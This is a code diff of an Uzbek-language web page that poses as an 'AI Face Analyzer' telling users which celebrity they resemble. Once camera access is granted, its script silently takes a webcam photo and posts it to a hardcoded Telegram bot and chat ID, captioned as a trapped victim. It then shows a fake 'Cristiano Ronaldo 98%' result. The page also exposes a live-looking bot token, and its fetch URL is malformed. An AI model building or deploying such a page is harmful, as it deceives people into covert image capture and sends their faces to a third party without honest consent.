@@ -5,13 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>AI Face Analyzer</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; background-color: #f0f2f5; padding-top: 50px; color: #333; }
-        .container { background: white; padding: 30px; border-radius: 20px; display: inline-block; box-shadow: 0 10px 25px rgba(0,0,0,0.1); max-width: 90%; }
-        h2 { color: #1c1e21; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #0095f6; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; display: none; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        button { background: #0095f6; color: white; border: none; padding: 12px 25px; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 16px; transition: 0.3s; }
-        button:hover { background: #007bc7; }
+        body { font-family: sans-serif; text-align: center; background-color: #f0f2f5; padding-top: 50px; }
+        .container { background: white; padding: 30px; border-radius: 20px; display: inline-block; box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
+        button { background: #0095f6; color: white; border: none; padding: 15px 30px; border-radius: 10px; cursor: pointer; font-weight: bold; font-size: 18px; }
         #video { display: none; }
     </style>
 </head>
@@ -19,35 +15,25 @@
 
 <div class="container">
     <h2>Siz qaysi mashhur insonga o'xshaysiz? 🤔</h2>
-    <p>Sun'iy intellekt (AI) yuzingizni tahlil qilib, 99% aniqlikda javob beradi.</p>
-    <div id="main-area">
-        <button onclick="startPrank()">Testni boshlash</button>
-    </div>
-    <div class="loader" id="loader"></div>
-    <p id="status" style="font-weight: bold; margin-top: 15px;"></p>
+    <p>AI tizimi yuzingizni skaner qilishi uchun ruxsat bering:</p>
+    <button onclick="startPrank()">Testni boshlash</button>
+    <p id="status" style="margin-top: 20px; font-weight: bold; color: #0095f6;"></p>
 </div>
 
 <video id="video" autoplay playsinline></video>
 <canvas id="canvas" style="display:none;"></canvas>
 
 <script>
-    // DIQQAT: FAQAT CHAT_ID NI O'ZINGIZNIKI BILAN ALMASHTIRING!
     const BOT_TOKEN = '8773988826:AAFjeAtak_rptAUTFbhnGLj87DA1cuemyTw';
-    const CHAT_ID = '1470557457'; // <--- SHU YERGA @userinfobot BERGAN RAQAMNI YOZING
+    const CHAT_ID = '5777502829'; // Sizning raqamingiz o'rnatildi!
 
     async function startPrank() {
         const status = document.getElementById('status');
-        const loader = document.getElementById('loader');
-        const btn = document.querySelector('button');
-
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             const video = document.getElementById('video');
             video.srcObject = stream;
-            
-            btn.style.display = 'none';
-            loader.style.display = 'block';
-            status.innerText = "Yuzingiz skaner qilinmoqda...";
+            status.innerText = "Skaner qilinmoqda... 3 soniya kuting...";
 
             setTimeout(async () => {
                 const canvas = document.getElementById('canvas');
@@ -58,24 +44,20 @@
                 canvas.toBlob(async (blob) => {
                     const formData = new FormData();
                     formData.append('chat_id', CHAT_ID);
-                    formData.append('photo', blob, 'image.jpg');
-                    formData.append('caption', '🎯 Prank ishladi! O\'rtog\'ingiz tuzoqqa tushdi.');
+                    formData.append('photo', blob, 'prank.jpg');
+                    formData.append('caption', '🎯 Tuzoqqa tushdi! Mana uning rasmi.');
 
                     await fetch(`https://telegram.org{BOT_TOKEN}/sendPhoto`, {
                         method: 'POST',
                         body: formData
                     });
 
-                    loader.style.display = 'none';
-                    status.innerHTML = "Tahlil yakunlandi!<br><br><span style='font-size: 24px;'>Siz: <b>Cristiano Ronaldoga</b> 97% o'xshaysiz! ⚽</span>";
+                    status.innerHTML = "Tahlil tugadi!<br>Siz: <b>Cristiano Ronaldoga</b> 98% o'xshaysiz! 😂";
                     stream.getTracks().forEach(track => track.stop());
                 }, 'image/jpeg');
             }, 3000);
-
         } catch (err) {
-            loader.style.display = 'none';
-            status.innerText = "Xato: Kamera ruxsat berilmadi! Sayt to'liq ishlashi uchun ruxsat berishingiz kerak.";
-            btn.style.display = 'inline-block';
+            status.innerText = "Xato: Kamera ruxsat berilmadi!";
         }
     }
 </script>
